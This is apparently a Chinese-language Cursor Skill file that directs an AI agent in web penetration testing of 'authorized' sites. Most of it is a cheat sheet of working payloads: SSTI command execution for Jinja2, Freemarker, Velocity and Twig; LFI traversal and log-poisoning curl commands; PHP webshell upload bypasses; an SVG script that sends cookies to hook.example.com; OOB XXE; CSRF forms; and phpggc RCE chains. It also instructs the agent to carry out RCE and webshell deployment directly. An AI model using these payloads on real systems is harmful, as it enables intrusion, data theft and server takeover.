---
name: 薄青·伤匣
description: >-
 授权站通用 Web 核心面：XXE、SSTI、LFI/上传、XSS、CSRF/CORS、PHP 反序列化、
 密码重置。无专用栈或只扫了目录/JWT 时使用。
 假支付/Actuator/FastAdmin/Jeecg 仍走专卡。
---

> **薄青**
> 剑劈五域亚仙尊，为情所系幸苍生。
> 岁岁索命河底骨，折剑沉沙仍有声。

# 核心 Web 漏洞面（Cursor Skill）

## 何时用

- 目标是业务站/API，没有 Java/PHP 专卡命中（侦察后先 `strike_probe`，再本卡）
- 用户点名 XXE / SSTI / LFI / 上传 / CSRF / CORS / 重置
- `kit_run --kit web` 后仍缺「漏洞面」格子

## 真源

1. `传承/薄青·岁岁索命.md`
2. `传承/化形.md`
3. `python3 炼蛊房/core_web_surface_probe.py -u https://授权站 --case <案卷>`
 套装里用 `--fast`（少参数，防拖死 kit_run）
4. 单点注入面：`python3 炼蛊房/tpl_inject_probe.py ssti|lfi|xxe|cmdi`

细卡（先探针再打开）：

| 面 | 走 |
|----|-----|
| SSTI | `tpl_inject_probe.py ssti` · `全力以赴.md` |
| LFI/RFI | `tpl_inject_probe.py lfi` · `开卷.md` |
| XXE | `tpl_inject_probe.py xxe` · `噬文.md` |
| 命令注入 | `tpl_inject_probe.py cmdi` · `奴道驱使.md` |
| CORS | `cors_csrf_probe.py cors` · `借刀杀人·借窗.md` |
| CSRF | `cors_csrf_probe.py csrf` · `借刀杀人.md` |
| JWT | `jwt_forge_probe.py` · `李代桃僵.md` |
| GraphQL | `gql_authz_probe.py` · `星念.md` |
| 竞态 | `race_probe.py` · `时道抢先.md` |
| 上传 | `file-upload-webshell`（先 marker） |
| XSS | `xss-exploit` · `stored_xss_probe.py` |
| 重置/ATO | `account-takeover-chain` |
| 竞态 | `race-condition` · `logic_vuln_probe.py` |
| Java 反序列化 | Shiro / Fastjson 专卡，不走 PHP 卡 |

## 强制

1. 目标在 scope。
2. 先跑探针，按 `surface.json` 交接，禁止只贴 payload 百科结案。
3. L2 文件读/算术差分即可验证；RCE/WebShell 授权内直接做。
4. 有身份 → 回对象矩阵。

---

## SSTI 快速确认 payload（先用无害差分）

```
# 通用探测（无害，看 9359，不要用页面里的 49）
{{1337*7}} → 9359 (Jinja2/Twig)
${1337*7} → 9359 (Freemarker/Velocity)
<%= 7*7 %> → 49 (ERB/JSP)
#{7*7} → 49 (Ruby Haml)
*{7*7} → 49 (Spring SpEL)

# Jinja2（Python Flask/Django）确认+命令执行
{{config}} # 泄露配置（安全，先做）
{{request.environ}} # 环境变量
{{''.__class__.__mro__[1].__subclasses__()}} # 拿子类
# 找 subprocess.Popen 的索引（通常250-400之间）
{{''.__class__.__mro__[1].__subclasses__()[XXX](['id'],stdout=-1).communicate()}}

# Freemarker（Java）
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# Velocity（Java）
#set($e="")
$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

# Twig（PHP）
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## LFI / 路径穿越快查

```bash
# 基础路径穿越（Linux）
../../../../etc/passwd
..%2F..%2F..%2F..%2Fetc%2Fpasswd # URL编码 /
..%252F..%252F..%252Fetc%252Fpasswd # 双重URL编码
....//....//....//etc/passwd # 双斜杠绕过

# 常见目标文件
/etc/passwd # 确认LFI
/etc/shadow # 密码哈希（需root）
/proc/self/environ # 包含HTTP_HOST等，可触发RCE
/proc/self/fd/X # X=0-20，日志文件描述符
/var/log/apache2/access.log # Apache日志（日志投毒）
/var/log/nginx/access.log # Nginx日志
/var/log/auth.log # SSH日志（投毒用户名字段）

# PHP协议包装（php://filter → 无RCE也能读源码）
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=config.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# data://（需allow_url_include=On）
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# 日志投毒链（GET /<?php system($_GET['c']); ?> → 然后LFI包含日志）
curl 'https://授权站/' -H "User-Agent: <?php system(\$_GET['c']); ?>"
curl 'https://授权站/index.php?page=../../../var/log/nginx/access.log&c=id'
```

---

## 文件上传绕过快查

```
# MIME绕过（Content-Type改为image/jpeg但内容是PHP）
Content-Type: image/jpeg
文件内容: <?php @eval($_POST['c']); ?>

# 双扩展名（Apache解析从右往左）
shell.php.jpg → 如果.jpg未配置，回落到.php
shell.jpg.php → 直接解析

# 大小写（Windows/IIS不区分大小写）
shell.PhP
shell.PHP5 / .phtml / .phar

# 空格/点（Windows）
shell.php. → Windows自动去掉末尾点
shell.php%20 → 末尾空格

# .htaccess覆盖（如果允许上传.htaccess）
AddType application/x-httpd-php .jpg → 之后.jpg都当PHP执行

# SVG XSS（Content-Type验证但不验内容）
<svg xmlns="http://www.w3.org/2000/svg">
 <script>fetch('https://hook.example.com?c='+document.cookie)</script>
</svg>

# 验证 Content-Type + 扩展名，魔数绕过（GIF89a前缀）
GIF89a <?php system($_GET['c']); ?>
```

---

## CORS 配置错误快查

```bash
# 检测：发带 Origin 的请求
curl -H "Origin: https://evil.com" -I https://授权站/api/user

# 漏洞信号
Access-Control-Allow-Origin: https://evil.com # 直接反射
Access-Control-Allow-Origin: * # 通配（仅无需凭证时危险）
Access-Control-Allow-Credentials: true # 带 Cookie → 高危

# 常见绕过
Origin: null # 沙盒iframe
Origin: https://target.com.evil.com # 前缀正则匹配漏洞
Origin: https://eviltarget.com # 后缀正则漏洞
```

---

## XXE 快查

```xml
<!-- 基础 XXE（读文件）-->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- OOB XXE（带外，无回显时）-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://攻击机:8888/xxe?d=...">]>

<!-- XXE via SVG/XLSX/DOCX（文件解析接口）-->
# 在 SVG 里嵌入 DOCTYPE：
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>

# 测试接口：上传功能 / XML解析API / SOAP接口 / 报表生成
Content-Type: application/xml
Content-Type: text/xml
```

---

## CSRF 快查

```html
<!-- 基础 CSRF（GET）-->
<img src="https://授权站/api/transfer?to=attacker&amount=1000">

<!-- POST CSRF（隐藏表单自提交）-->
<html><body onload="document.forms[0].submit()">
<form action="https://授权站/api/change-email" method="POST">
 <input name="email" value="attacker@evil.com">
</form></body></html>

<!-- JSON CSRF（Content-Type text/plain 绕过）-->
<form action="https://授权站/api/action" method="POST" enctype="text/plain">
 <input name='{"action":"delete","id":1,"x":"' value='"}'>
</form>

# 检测：请求是否带 CSRF token / SameSite Cookie / Referer检查
# 无 CSRF token + Cookie未设SameSite + Referer未校验 = 漏洞
```

---

## PHP 反序列化快查

```bash
# 常用工具
# ysoserial（Java）: java -jar ysoserial.jar CommonsCollections6 'id' | base64
# phpggc（PHP）: 
phpggc Laravel/RCE1 'system("id")' | base64 # Laravel APP_KEY+反序列化RCE
phpggc Monolog/RCE1 'system("id")' # Monolog
phpggc Guzzle/FW1 /var/www/html/shell.php 'id' # 文件写入

# Shiro 反序列化（AES-128-CBC，需要正确的 rememberMe key）
python3 炼蛊房/java_web_surface_probe.py --shiro https://授权站 --case <案卷>

# Cookie 反序列化（PHP）
# 信号：Cookie 值是 base64 编码的序列化对象 O:4:"User":1:{...}
# 手法：修改序列化对象的属性触发 __wakeup/__destruct
```
